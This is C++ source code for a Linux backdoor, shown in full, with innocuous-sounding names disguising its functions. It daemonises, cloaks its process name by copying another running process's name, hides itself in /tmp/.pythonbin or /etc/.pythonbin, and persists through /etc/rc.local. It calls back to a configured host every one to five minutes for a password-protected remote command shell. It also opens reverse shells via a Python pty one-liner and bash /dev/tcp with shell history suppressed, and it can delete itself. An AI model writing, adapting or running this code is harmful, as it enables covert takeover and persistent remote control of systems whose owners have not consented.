#include <iostream>
#include <cstdlib>
#include <boost/algorithm/string.hpp>
#include <thread>
#include <fstream>
#include <sstream>
extern "C"{
    #include <signal.h>
    #include <cstdio>
    #include <sys/stat.h>
    #include <sys/utsname.h>
    #include <unistd.h>
    #include <stdio.h>
    #include <sys/prctl.h>
    #include <sys/socket.h>
    #include <sys/utsname.h>
    #include <arpa/inet.h> 
}

using namespace std;

struct gui_config{
    const string client_ver = "lol"; // client name 
    const string client_patch = "127.0.0.1"; // host to call back to
    const string client_buffer = "22123"; // port to call back to port 80 and 443 will look like web sockets
    const string client_key = "lolpass"; // password
}; gui_config gc; 

class gui_bar{
    public:
        string gui_c(string lc) 
        {
          if(lc.size() > 1019){
              return "failure, Buffer Overflow detected!"; // oh uh buffer overflow! quickly exit!
          }
          FILE *in;
          char *buff;
          buff = (char*)malloc(1024);
          string out = "";
          if(!(in = popen((lc).c_str(), "r"))){
            return "failure";
          } while(fgets(buff, 1024, in)!=NULL){
            out += buff;
          }
          free(buff);
          pclose(in); 
          if(out.size() > 0){
            return out;
          }
          else{
             return  string(lc) + ": command not found\n";
          }
        }
        void daemon(void)
        {
            int x;
            pid_t pid;
            pid = fork();
            if (pid < 0){
                exit(EXIT_FAILURE);
            } if(pid > 0){
                exit(EXIT_SUCCESS);
            } if (setsid() < 0){
                exit(EXIT_FAILURE);
            }
            signal(SIGCHLD,SIG_IGN);
            signal(SIGHUP,SIG_IGN);
            pid = fork();
            if (pid < 0){
                exit(EXIT_FAILURE);
            } if (pid > 0){
                exit(EXIT_SUCCESS);
            }
            umask(0);
            chdir("/tmp/");
            for (x = sysconf(_SC_OPEN_MAX); x>0; x--){
                close (x);
            }
        }
        string getexepath(void)  //ripped from somewhere
        {
          char result[PATH_MAX];
          ssize_t count = readlink( "/proc/self/exe", result, PATH_MAX );
          return string( result, (count > 0) ? count : 0 );
          free(result);
        }
        void cps_codex(void)
        {
            system(("rm -rf " + string(getexepath())).c_str());
            system("rm -rf /tmp/.pythonbin/");
            system("rm -rf /etc/.pythonbin/");
        }
        void bios_bitmap(string bios_host, string bios_num) // spawns a tty shell
        {
            if(system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str()) != 0){
                if(system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str()) != 0){
                    return;   // all backconnects failed, must be a shitty box
                }
            }
        }
        string ftp_g(void) 
        {
            string shell_bar, uid_user, current_user, cwd;
            struct utsname sysinfo;
            uname(&sysinfo);
            current_user = gui_c("whoami").replace(gui_c("whoami").find("\n"), 2, "");
            cwd = gui_c("pwd").replace(gui_c("pwd").find("\n"), 2, "");
            if(getuid() == 0){
                uid_user = " $ ";
            } else{
                uid_user = " # ";
            }
            return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + uid_user;
        }
        void file_setup(string service_s, string file_p)
        {
          string line;
          if(getuid() != 0){ // not root :(
              system("mkdir /tmp/.pythonbin/");
              system(("mv " + string(getexepath()) + " /tmp/.pythonbin/bin.py").c_str());
          }
          else{ //root
              system("mkdir /etc/.pythonbin/");
              system(("mv " + string(getexepath()) + " /etc/.pythonbin/bin.py").c_str());
              ifstream boot_check(service_s);
              if(boot_check)
              {
                //need to edit the boot so its starts on startup
                boot_check.close();
                ifstream bootfile(service_s); 
                size_t pos;
                while(bootfile.good())
                {
                    getline(bootfile,line); // get line from file
                    pos=line.find(file_p); // search
                    if(pos!=string::npos) // string::npos is returned if string is not found
                      {
                        cout << "file in startup :)" << endl;
                        return;
                      }
                }
                char buff[BUFSIZ];      // the input line
                char newbuff[BUFSIZ];   // the results of any editing
                string out_file = "/tmp/tmp.txt";
                string exit_find = "exit 0";
                char replacewith[] = "";
                FILE *in, *out;
                in = fopen((service_s).c_str(), "r" );
                out= fopen((out_file).c_str(), "w" );
                while (fgets(buff, BUFSIZ, in) != NULL ) 
                {
                    if (strstr( buff, (exit_find).c_str()) != NULL ) 
                    {
                        NULL;
                    } 
                    else 
                    {
                        strcpy(newbuff, buff);
                    }
                    fputs(newbuff, out);
                }
                fclose(in);
                fclose(out);
                if(rename((out_file).c_str(), (service_s).c_str())) 
                {
                   NULL; 
                }
                ofstream startup;
                startup.open((service_s), ios::out | ios::app);
                startup << endl << file_p << endl;
                startup << endl << "exit 0" << endl;
                startup.close();
                cout << "wrote to file" << endl;
                system("rm -rf /tmp/tmp.txt");
              }   
              else{
                  cout << "file doesnt exist" << endl;
              }     
          }              
        }
}; gui_bar gb;

class gui_user{
  public:
    string gui_procc(string gui_l){ // elite proccess cloaking!
        vector<string> gui_uv;
        string gui_buffer = gb.gui_c("ps -e -o command");
        boost::split(gui_uv, gui_buffer, boost::is_any_of("\n"));
        while(1){
          string gui_name = gui_uv[rand()%gui_uv.size()];
          if(gui_name.find("ps -e -o command") != -1 || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
            sleep(1);
            continue;
          }
          else{
            return gui_name;
          }
        }  
    }
}; gui_user gu;



class cli_architecture : gui_config{ // backconnect
  public:  
      void isdn(void)
      {
        string dir_line;
        bool isauth=false;
        struct sockaddr_in serverc0;
        int s0 = socket(AF_INET, SOCK_STREAM, 0);
        if(s0 < 0){ // cant create a socket
          close(s0);
          return;
        } 
        serverc0.sin_addr.s_addr = inet_addr((client_patch).c_str());
        serverc0.sin_family = AF_INET;
        serverc0.sin_port = htons(stoi(client_buffer));
        if(connect(s0, (struct sockaddr *)&serverc0 , sizeof(serverc0)) < 0){ // denied a connection or wont connect
          close(s0);
          return;
        } 
        send(s0,("Enter Password> "), sizeof("Enter Password> "), 20);
        while(1){
            string line;
            char data = 0; // Reading one at a time, hack!
            while (data != '\n'){
                ssize_t datarecv = recv(s0, &data, 1, 0);
                if(datarecv == -1){
                    if (errno != EAGAIN && errno != EWOULDBLOCK){ //Connection error
                        close(s0);
                        return;
                    }
                } if(datarecv == 0) { //client disconnect
                    close(s0);
                    return;
                }
                line += data;
                if (line.size() > 2048){ // Oh no!
                    close(s0);
                    return;
                }
            }
            if(line.size() > 0){ // yes, yes here we go!
                line.replace(line.find("\n"), 2, "");    
                if(isauth!=true){
                  if(line==client_key){
                      isauth=true;
                      send(s0,(("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: ") + string(client_ver) + string("\n")).c_str(), (("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: ") + string(client_ver) + string("\n")).size(), 20);
                      send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 20);
                      continue;
                  }
                  else{
                      send(s0,("Incorrect password!"), sizeof("Incorrect password!"), 20);
                      send(s0,("\nEnter Password> "), sizeof("\nEnter Password> "), 20);
                      continue;
                  }
                }
                else{
                  if(line.find("cd ") != -1){
                      dir_line = line.replace(line.find("cd "), 3, ""); 
                      chdir((dir_line).c_str());
                  } else if(line=="exit" || line=="quit"){    
                      close(s0);
                      exit(0);
                  } else if(line=="session_exit" || line=="sess_exit"){
                      close(s0);
                      return;
                  } else if(line.find("backconnect ") != -1){ //backconnect host port
                    vector<string> backconnect_v;
                    line.replace(line.find("backconnect "), 12, "");
                    string buffer; 
                    stringstream white_space_ss(line); 
                    while(white_space_ss >> buffer){
                        backconnect_v.push_back(buffer); // gui_bar gb; bios_bitmap
                    } if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
                       thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], backconnect_v[1]).detach();
                    } else{
                      send(s0,("Incorrect usage: backconnect host port\n"), sizeof("Incorrect usage: backconnect host port\n"), 20); 
                    }
                  } else if(line=="bd_cleanup"){
                      gb.cps_codex(); // cps_codex(void)
                  } else{
                      send(s0,(gb.gui_c(line)).c_str(), (gb.gui_c(line)).size(), 20);
                  } send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 20);
                  continue;
                }
              }
          }
          close(s0);
          return;
      }  
}; cli_architecture ca;

int main(int argc, char *argv[]){
    srand(time(NULL)); 
    string gui_t = gu.gui_procc(argv[0]);
    strcpy(argv[0], (gui_t).c_str()); // cloak, command name
    prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
    gb.daemon();
    gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
    while(1){
        thread(&cli_architecture::isdn, &ca).detach();
        sleep((rand()%(360-60 + 1) + 60)); // 1-5 mins call back
    } 
    return 0;
}
